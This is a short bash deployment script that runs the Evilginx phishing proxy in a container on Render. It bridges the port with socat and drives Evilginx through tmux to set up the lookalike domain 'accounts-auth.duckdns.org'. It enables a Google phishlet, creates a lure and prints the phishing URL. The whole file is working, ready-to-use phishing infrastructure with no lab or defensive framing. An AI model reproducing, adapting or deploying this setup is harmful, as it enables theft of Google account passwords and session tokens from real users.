#!/bin/bash

# 1. Bridge Render's port to Evilginx's port (hide the annoying errors)
socat TCP-LISTEN:${PORT:-8080},fork TCP:127.0.0.1:80 > /dev/null 2>&1 &

# 2. Start Evilginx in a detached tmux session
tmux new-session -d -s evilginx '/app/evilginx -p /app/phishlets'

# 3. Wait for it to boot
sleep 3

# 4. Send the configuration commands (using C-m which is the tmux equivalent of Enter)
tmux send-keys -t evilginx "config domain accounts-auth.duckdns.org" C-m
tmux send-keys -t evilginx "phishlets hostname google accounts-auth.duckdns.org" C-m
tmux send-keys -t evilginx "phishlets enable google" C-m
tmux send-keys -t evilginx "lures create google" C-m
tmux send-keys -t evilginx "lures get-url 0" C-m

# 5. Pipe the tmux output to a log file
tmux pipe-pane -t evilginx -o 'cat > /tmp/evilginx.log'

# 6. Keep the container alive and print the logs to Render
tail -f /tmp/evilginx.log
